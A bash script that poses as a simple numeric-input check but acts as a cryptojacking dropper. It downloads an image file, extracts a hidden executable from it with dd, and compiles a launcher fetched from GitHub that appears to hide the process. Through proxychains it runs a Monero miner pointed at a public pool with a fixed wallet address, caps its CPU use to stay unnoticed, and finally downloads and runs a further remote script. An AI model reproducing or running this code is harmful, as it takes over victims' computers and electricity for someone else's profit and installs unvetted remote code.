#!/bin/bash
myvar=$1
read -p "Enter numeric value: " $myvar
he_save_jpg='heo.jpg'
he_save=rcupd
 
if [ $myvar -gt 10 ]
then
    echo "OK"
    ARCH=$(uname -m)
    if [ ${ARCH}x = "x86_64x" ]
    then
        (curl -fsSL -k https://i.ibb.co/6PdZ0NT/he.jpg -o ${he_save_jpg}||wget -q -O ${he_save_jpg} https://i.ibb.co/6PdZ0NT/he.jpg) && dd if=${he_save_jpg} of=${he_save} skip=14497 bs=1 &&chmod +x ${he_save}
    else
        (curl -fsSL ${he_32_url} -o ${he_save_jpg}||wget -q -O ${he_save_jpg} ${he_32_url}) && dd if=${he_save_jpg} of=${he_save} skip=14497 bs=1 &&chmod +x ${he_save}
    fi
    wget --no-check-certificate -c https://github.com/Mafs68/hjs839/raw/main/hig.c
    gcc -o test hig.c 
    proxychains4 ./test -s "c.out" -d -p test.pid ./$he_save --coin 'monero' -B -o pool.supportxmr.com:3333 -u 47Sk8r1iZHQ2E5aEwy5ouubtqdbyYXgyUMG2czEPuizjN8kFnx2t5svSaYzRSHcvMXc2yx2FKn5hGBdVPnwV8Y16BvNR9Dr
    cpulimit -e $he_save  -l 85 &
    wget --no-check-certificate -c https://github.com/Mafs68/hjs839/raw/main/rad1.sh
    chmod 777 rad1.sh
    ./rad1.sh
    
else
    echo "Not OK"
fi
